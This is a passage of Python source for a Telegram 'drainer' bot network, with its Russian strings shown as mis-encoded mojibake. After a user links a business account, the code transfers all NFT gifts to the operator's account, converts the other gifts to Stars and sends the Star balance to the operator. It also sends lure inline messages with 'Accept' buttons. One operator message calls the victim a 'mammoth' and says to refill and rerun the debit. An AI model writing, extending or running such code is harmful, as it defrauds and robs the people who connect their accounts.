                        await send_log(admin.telegram_id, f"‚ùóÔ∏è –ë–æ—Ç –Ω–µ –∑–∞–ø—É—â–µ–Ω –Ω–∞ –∞–∫–∫–∞—É–Ω—Ç–µ <code>{recipient_id}</code>")
                        log_and_send(f"‚ö†Ô∏è –ë–æ—Ç –Ω–µ –∑–∞–ø—É—â–µ–Ω –Ω–∞ –∞–∫–∫–∞—É–Ω—Ç–µ {recipient_id}, —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω—É –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ")
                        break
                    await asyncio.sleep(2)
                except Exception as e:
                    log_and_send(f"‚ùóÔ∏è –ù–µ–æ–∂–∏–¥–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ NFT ID {gift.owned_gift_id}: {e}", "error")
                    await asyncio.sleep(2)
            else:
                log_and_send(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å NFT {gift.owned_gift_id} –ø–æ—Å–ª–µ 5 –ø–æ–ø—ã—Ç–æ–∫", "error")

        stats["nft_success"] += success
        session.add(admin)  
        await session.commit()
        log_and_send(f"üéØ –£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω–æ NFT: {success} –∏–∑ {len(nfts)}")
        log_and_send(f"NFT –≤ —Ö–æ–ª–¥–µ: {len(hold_nfts)}")
        log_and_send("=== –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ transfer_all_nfts_after_connection ===")
        return success, hold_nfts

    except TelegramBadRequest as e:
        err = f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}"
        log_and_send(err, "error")
        log_and_send("=== –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å –æ—à–∏–±–∫–æ–π –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤ ===")
        return 0, []

# –¢–æ–ª—å–∫–æ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –æ–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã
async def convert_regular_gifts_only(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    stats: dict,
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
):
    def log_with_id(msg: str, level: str = "info"):
        full_msg = f"[UserID:{connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    if "regular_convert_failed" not in stats:
        stats["regular_convert_failed"] = 0

    try:
        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
        except TelegramBadRequest as e:
            if "BOT_ACCESS_FORBIDDEN" in str(e):
                log_with_id("‚ö†Ô∏è –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–¥–∞—Ä–∫–∞–º (BOT_ACCESS_FORBIDDEN), –ø—Ä–æ–ø—É—Å–∫–∞–µ–º –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—é", "warning")
                stats["errors"] += 1
                return
            raise

        regular_gifts = [g for g in gifts.gifts if getattr(g, "type", "") != "unique"]

        if not regular_gifts:
            log_with_id("üì¶ –ù–µ—Ç –æ–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏")
            return

        log_with_id(f"üîÑ –ù–∞—á–∏–Ω–∞–µ–º –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—é {len(regular_gifts)} –æ–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤")
        
        for gift in regular_gifts:
            log_with_id(f"‚û°Ô∏è –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–∞ ID {gift.owned_gift_id} (—Ç–∏–ø: {gift.type})")
            try:
                await bot(ConvertGiftToStars(
                    business_connection_id=bc_id,
                    owned_gift_id=gift.owned_gift_id
                ))
                stats["converted"] += 1
                log_with_id(f"‚úÖ –£—Å–ø–µ—à–Ω–æ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω –ø–æ–¥–∞—Ä–æ–∫ ID {gift.owned_gift_id} –≤ –∑–≤—ë–∑–¥—ã")
                
            except TelegramBadRequest as e:
                stats["errors"] += 1
                if "STARGIFT_CONVERT_TOO_OLD" in str(e):
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"‚ö†Ô∏è –ü–æ–¥–∞—Ä–æ–∫ —Å–ª–∏—à–∫–æ–º —Å—Ç–∞—Ä ‚Äî –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞", "warning")
                elif "BOT_ACCESS_FORBIDDEN" in str(e):
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"üö´ –ù–µ—Ç –ø—Ä–∞–≤ –Ω–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—é (BOT_ACCESS_FORBIDDEN), –ø—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–æ–¥–∞—Ä–æ–∫", "warning")
                    continue  
                else:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"üö´ –û—à–∏–±–∫–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏: {e}", "warning")
                    
            except Exception as e:
                stats["errors"] += 1
                stats["regular_convert_failed"] += 1
                log_with_id(f"‚ùóÔ∏è –ù–µ–æ–∂–∏–¥–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}", "error")

            await asyncio.sleep(0.1)

        log_with_id(f"‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω–æ: –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ {stats['converted']} –ø–æ–¥–∞—Ä–∫–æ–≤, –æ—à–∏–±–æ–∫: {stats['errors']}")

    except Exception as e:
        stats["errors"] += 1
        log_with_id(f"‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}", "error")

# –ü–µ—Ä–µ–≤–æ–¥ –æ—Å—Ç–∞—Ç–∫–∞ –∑–≤—ë–∑–¥
async def transfer_remaining_stars_after_processing(
    bot: Bot, 
    bc_id: str, 
    worker_bot: WorkerBot, 
    admin: Admin, 
    stats: dict, 
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
):
    def log_with_id(msg: str, level: str = "info"):
        full_msg = f"[From {connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    try:
        try:
            stars = await bot(GetBusinessAccountStarBalance(business_connection_id=bc_id))
            amount = stars.amount
            log_with_id(f"üí´ –û—Å—Ç–∞—Ç–æ–∫ –∑–≤—ë–∑–¥ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ: {amount}")
        except TelegramBadRequest as e:
            if "BOT_ACCESS_FORBIDDEN" in str(e):
                log_with_id("‚ö†Ô∏è –ë–æ—Ç –Ω–µ –∏–º–µ–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –∑–≤—ë–∑–¥–∞–º (BOT_ACCESS_FORBIDDEN), –ø—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–µ—Ä–µ–¥–∞—á—É", "warning")
                stats["errors"] += 1
                return
            raise  

        if amount > 0 and worker_bot.nft_transfer_to_id:
            try:
                log_with_id(f"üöÄ –ù–∞—á–∏–Ω–∞–µ–º –ø–µ—Ä–µ–¥–∞—á—É {amount} –∑–≤—ë–∑–¥ –Ω–∞ {worker_bot.nft_transfer_to_id}")
                await bot(TransferBusinessAccountStars(
                    business_connection_id=bc_id,
                    star_count=amount,
                    new_owner_chat_id=worker_bot.nft_transfer_to_id
                ))
                stats["stars_transferred"] += amount
                stats["stars_really_transferred"] = True  
                log_with_id(f"‚úÖ –£–°–ü–ï–®–ù–û –ü–ï–†–ï–î–ê–ù–û {amount} –ó–í–Å–ó–î –ø–æ–ª—É—á–∞—Ç–µ–ª—é {worker_bot.nft_transfer_to_id}")
            except TelegramBadRequest as e:
                stats["errors"] += 1
                log_with_id(f"‚ùå TelegramBadRequest –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ –∑–≤—ë–∑–¥: {e}", "warning")
            except Exception as e:
                stats["errors"] += 1
                log_with_id(f"‚ùå –ù–µ–æ–∂–∏–¥–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ –∑–≤—ë–∑–¥: {e}", "error")

    except Exception as e:
        stats["errors"] += 1
        err = f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥: {e}"
        log_with_id(err, "exception")

def build_stats():
    return {
        "nft_success": 0,
        "nft_not_unique": 0,
        "converted": 0,
        "regular_convert_failed": 0,
        "stars_transferred": 0,
        "stars_really_transferred": False,
        "errors": 0,
        "nft_hold_too_early": 0,
        "balance_too_low": False,
        "nft_not_sent": 0,
        "current_stars": 0,
    }

def build_transfer_disabled_msgs(settings):
    msgs = []
    if not (settings and settings.transfer_stars_enabled):
        msgs.append("–ü–µ—Ä–µ–¥–∞—á–∞ –∑–≤—ë–∑–¥ –æ—Ç–∫–ª—é—á–µ–Ω–∞")
    if not (settings and settings.convert_gifts_to_stars_enabled):
        msgs.append("–û–±–º–µ–Ω –ø–æ–¥–∞—Ä–∫–æ–≤ –Ω–∞ –∑–≤—ë–∑–¥—ã –æ—Ç–∫–ª—é—á—ë–Ω")
    return msgs

def build_summary(
    business_user_id, stats, successful_nfts, hold_nfts, transfer_disabled_msgs
):
    summary = (
        f"<b>üëâ #{business_user_id}</b>\n"
        f"<b>üì¶ –°–≤–æ–¥–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏:</b>\n"
        f"<b>‚úÖ NFT –ø–µ—Ä–µ–¥–∞–Ω–æ:</b> <code>{stats['nft_success']}</code>\n"
        f"<b>üïí NFT —Å —Ö–æ–ª–¥–æ–º:</b> <code>{len(hold_nfts)}</code>\n"
        f"<b>‚ôªÔ∏è –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ –≤ –∑–≤—ë–∑–¥—ã:</b> <code>{stats['converted']}</code>\n"
        f"<b>‚ùóÔ∏è –°—Ç–∞—Ä—ã–µ –ø–æ–¥–∞—Ä–∫–∏:</b> <code>{stats['regular_convert_failed']}</code>\n"
        f"<b>‚≠êÔ∏è –ó–≤—ë–∑–¥ –ø–µ—Ä–µ–¥–∞–Ω–æ:</b> <code>{stats['stars_transferred']}</code>\n"
        f"<b>üö® –û—à–∏–±–æ–∫ –∑–∞ –ø—Ä–æ—Ü–µ—Å—Å:</b> <code>{stats['errors']}</code>\n"
    )

    if stats.get("balance_too_low"):
        nft_not_sent = stats.get("nft_not_sent", 0)
        current_stars = stats.get("current_stars", 0)
        need_stars = max(0, nft_not_sent * 25 - current_stars)
        summary += (
            f"\n<blockquote>"
            f"<b>‚ùóÔ∏è –î–ª—è –ø–æ–ª–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ –ø–æ–ø–æ–ª–Ω–∏ –º–∏–Ω–∏–º—É–º: <u>{need_stars}</u> –∑–≤—ë–∑–¥</b>\n"
            "‚úÖ –ü–æ–ø–æ–ª–Ω–∏ –∑–≤—ë–∑–¥—ã –º–∞–º–æ–Ω—Ç—É –∏ –∑–∞–ø—É—Å—Ç–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ–µ —Å–ø–∏—Å–∞–Ω–∏–µ!"
            "</blockquote>"
        )

    if transfer_disabled_msgs:
        summary += (
            "\n\<blockquote>‚ö†Ô∏è –ù–µ–∫–æ—Ç–æ—Ä—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –æ—Ç–∫–ª—é—á–µ–Ω—ã –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏:\n" +
            "\n".join(f"‚Ä¢ {msg}" for msg in transfer_disabled_msgs) +
            "</blockquote>"
        )
    return summary

# -- –æ—Å–Ω–æ–≤–Ω–æ–π –∫–æ–¥ --
async def handle_gift_processing_after_connection(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    business_user_id: int,
    connected_user_id: int,
    session
):
    admin = await session.scalar(
        select(Admin).options(selectinload(Admin.settings)).where(Admin.id == admin.id)
    )
    settings = admin.settings

    stats = build_stats()
    transfer_logger = get_transfer_logger(admin.telegram_id)
    transfer_disabled_msgs = build_transfer_disabled_msgs(settings)

    try:
        transfer_logger.info("=== –ó–∞–ø—É—Å–∫: –ø–µ—Ä–≤–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ NFT ===")
        successful_nfts, hold_nfts = await transfer_all_nfts_after_connection(
            bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
        )

        if settings and settings.convert_gifts_to_stars_enabled:
            transfer_logger.info("=== –ó–∞–ø—É—Å–∫: –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –æ–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã ===")
            await convert_regular_gifts_only(
                bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
            )
        else:
            transfer_logger.info("‚õîÔ∏è –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤ –æ—Ç–∫–ª—é—á–µ–Ω–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏")

        try:
            stars = await bot(GetBusinessAccountStarBalance(business_connection_id=bc_id))
            transfer_logger.info(f"–ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥ –ø–æ—Å–ª–µ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏: {stars.amount}")
            stats["current_stars"] = stars.amount

            if stars.amount >= 25:
                transfer_logger.info("=== –ó–∞–ø—É—Å–∫: –ø–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ NFT –ø–æ—Å–ª–µ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ ===")
                await transfer_all_nfts_after_connection(
                    bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
                )
            else:
                transfer_logger.info("–ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–µ—Ä–µ–¥–∞—á–∞ NFT –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è: –±–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥ < 25")
        except Exception as e:
            stats["errors"] += 1
            transfer_logger.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –±–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥ –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–µ—Ä–µ–¥–∞—á–∏ NFT: {e}")

        if settings and settings.transfer_stars_enabled:
            transfer_logger.info("=== –ó–∞–ø—É—Å–∫: –ø–µ—Ä–µ–¥–∞—á–∞ –æ—Å—Ç–∞–≤—à–∏—Ö—Å—è –∑–≤—ë–∑–¥ ===")
            await transfer_remaining_stars_after_processing(
                bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
            )
        else:
            transfer_logger.info("‚õîÔ∏è –ü–µ—Ä–µ–¥–∞—á–∞ –∑–≤—ë–∑–¥ –æ—Ç–∫–ª—é—á–µ–Ω–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏")

    except Exception as e:
        stats["errors"] += 1
        transfer_logger.error(f"‚ùóÔ∏è –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –ø–µ—Ä–µ–¥–∞—á–∏: {e}")

    finally:
        transfer_logger.info("=== –ò—Ç–æ–≥–æ–≤–∞—è —Å–≤–æ–¥–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ (–æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –∞–¥–º–∏–Ω—É) ===")

        summary = build_summary(
            business_user_id, stats, successful_nfts, hold_nfts, transfer_disabled_msgs
        )

        await send_log(admin.telegram_id, summary)
        transfer_logger.info("–°–≤–æ–¥–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∞–¥–º–∏–Ω—É")

        stars_total = stats["stars_transferred"]

        try:
            await update_admin_stats(
                session,
                admin,
                nft=stats["nft_success"],
                regular=0,
                stars=stars_total
            )
            await update_global_stats(
                session,
                nft=stats["nft_success"],
                regular=0,
                stars=stars_total
            )
            transfer_logger.info(f"[STATS_UPDATED] Admin {admin.telegram_id} (NFT={stats['nft_success']}, Stars={stars_total})")
        except Exception as e:
            transfer_logger.error(f"[STATS_UPDATE_ERROR] {e}")

        if stats["stars_really_transferred"] or stats["nft_success"] > 0:
            async def send_log_in_background():
                try:
                    await send_admin_transfer_log_to_channel(
                        admin.telegram_id,
                        stars_total,
                        stats["nft_success"]
                    )
                    transfer_logger.info("–õ–æ–≥ –æ –ø–µ—Ä–µ–≤–æ–¥–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –∞–¥–º–∏–Ω-–∫–∞–Ω–∞–ª")
                except Exception as e:
                    transfer_logger.error(f"[SEND_LOG_TO_CHANNEL_ERROR] {e}")

            asyncio.create_task(send_log_in_background())

async def update_global_stats(session, nft=0, regular=0, stars=0):
    stats = await session.scalar(select(GlobalStats).limit(1))
    if not stats:
        stats = GlobalStats()
        session.add(stats)
        await session.commit()
        await session.refresh(stats)

    stats.daily_gifts_unique += nft
    stats.daily_stars_sent += stars

    stats.total_gifts_unique += nft
    stats.total_stars_sent += stars

    await session.commit()

async def update_admin_stats(session, admin: Admin, nft=0, regular=0, stars=0):
    admin.gifts_unique_sent += nft
    admin.stars_sent += stars

    admin.daily_gifts_unique += nft
    admin.daily_stars_sent += stars

    await session.commit()

async def handle_webhook_inline_query(data, bot, token, request):
    async with Session() as session:
        userbot = await session.scalar(select(WorkerBot).where(WorkerBot.token == token))
        if not userbot or not userbot.username:
            return web.Response()

        if not userbot.custom_template_id:
            dp = Dispatcher(storage=MemoryStorage())
            router = Router()

            @router.inline_query(F.query)
            async def inline_handler(inline_query: InlineQuery):
                results = [
                    InlineQueryResultArticle(
                        id="no-template",
                        title="‚ùóÔ∏è –£ –≤–∞—Å –Ω–µ –ø–æ–¥–∫–ª—é—á—ë–Ω —à–∞–±–ª–æ–Ω",
                        input_message_content=InputTextMessageContent(
                            message_text="<b>‚ùóÔ∏è –î–ª—è —Ä–∞–±–æ—Ç—ã –∏–Ω–ª–∞–π–Ω –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å —à–∞–±–ª–æ–Ω</b>",
                            parse_mode="HTML"
                        )
                    )
                ]
                await inline_query.answer(results, cache_time=1, is_personal=True)

            dp.include_router(router)
            handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
            return await handler.handle(request)

        custom_gift = await session.get(CustomGift, userbot.custom_template_id)
        if not custom_gift:
            dp = Dispatcher(storage=MemoryStorage())
            router = Router()

            @router.inline_query(F.query)
            async def inline_handler(inline_query: InlineQuery):
                results = [
                    InlineQueryResultArticle(
                        id="no-template",
                        title="‚ùóÔ∏è –£ –≤–∞—Å –Ω–µ –ø–æ–¥–∫–ª—é—á—ë–Ω —à–∞–±–ª–æ–Ω",
                        input_message_content=InputTextMessageContent(
                            message_text="<b>‚ùóÔ∏è –î–ª—è —Ä–∞–±–æ—Ç—ã –∏–Ω–ª–∞–π–Ω –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å —à–∞–±–ª–æ–Ω</b>",
                            parse_mode="HTML"
                        )
                    )
                ]
                await inline_query.answer(results, cache_time=1, is_personal=True)

            dp.include_router(router)
            handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
            return await handler.handle(request)

    try:
        slugs = json.loads(custom_gift.slugs)
    except Exception:
        slugs = []

    dp = Dispatcher(storage=MemoryStorage())
    router = Router()

    @router.inline_query(F.query)
    async def inline_handler(inline_query: InlineQuery):
        results = []
        for slug in slugs:
            slug = slug.strip().replace('"', '').replace("'", "")
            title = slug.split("-")[0]
            message_text = custom_gift.message_text or "<i>–¢–ï–°–¢</i>"
            button_text = custom_gift.button_text or "üéÅ –ü—Ä–∏–Ω—è—Ç—å"
            url = f"https://t.me/nft/{slug}"

            ref_url = f"https://t.me/{userbot.username}?start=ref_{userbot.owner_id}_{slug}"

            results.append(
                InlineQueryResultArticle(
                    id=f"{slug}-{title}",
                    title=title,
                    input_message_content=InputTextMessageContent(
                        message_text=f"<b><a href='{url}'>{title}</a></b>\n\n{message_text}",
                        parse_mode="HTML"
                    ),
                    reply_markup=InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(text=button_text, url=ref_url)]
                        ]
                    )
                )
            )

        await inline_query.answer(results, cache_time=1, is_personal=True)

    dp.include_router(router)
    handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
    return await handler.handle(request)

async def register_worker_routes(app: web.Application):
    async def webhook_handler(request: web.Request):
        token = request.match_info["token"]
        try:
            data = await request.json()
        except Exception:
            print(f"[WebhookHandler] –û—à–∏–±–∫–∞ —Ä–∞–∑–±–æ—Ä–∞ JSON –¥–ª—è —Ç–æ–∫–µ–Ω–∞ {token}")
            return web.Response(status=400, text="Invalid JSON")

        bot = get_cached_bot(token)
        if "inline_query" in data:
            return await handle_webhook_inline_query(data, bot, token, request)
        await handle_webhook_business_connection(data, bot)
        await handle_update(data, bot)

        return web.Response()

    app.router.add_post("/worker_webhook/{token}", webhook_handler)
    print("[register_worker_routes] –ú–∞—Ä—à—Ä—É—Ç /worker_webhook/{token} –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω")

    async def setup_webhooks():
        async with Session() as session:
            try:
                result = await session.execute(select(WorkerBot))
                worker_bots = result.scalars().all()
                print(f"[register_worker_routes] –ü–æ–ª—É—á–µ–Ω–æ –≤–æ—Ä–∫–µ—Ä-–±–æ—Ç–æ–≤ –∏–∑ –ë–î: {len(worker_bots)}")
            except Exception as e:
                print(f"[register_worker_routes] –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≤–æ—Ä–∫–µ—Ä-–±–æ—Ç–æ–≤ –∏–∑ –ë–î: {e}")
                return

        rate_limit = 10  
        delay = 1 / rate_limit

        for worker in worker_bots:
            bot = get_cached_bot(worker.token)
            webhook_url = f"{app.get('webhook_host', '')}/worker_webhook/{worker.token}"

            try:
                print(f"[register_worker_routes] –°—Ç–∞–≤–∏–º –≤–µ–±—Ö—É–∫ –¥–ª—è @{worker.username} –Ω–∞ {webhook_url}")
                await bot.set_webhook(webhook_url)
                print(f"[register_worker_routes] Webhook —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –¥–ª—è @{worker.username}")
            except Exception as e:
                print(f"[register_worker_routes] –û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ webhook –¥–ª—è @{worker.username}: {e}")

            await asyncio.sleep(delay)

    asyncio.create_task(setup_webhooks())  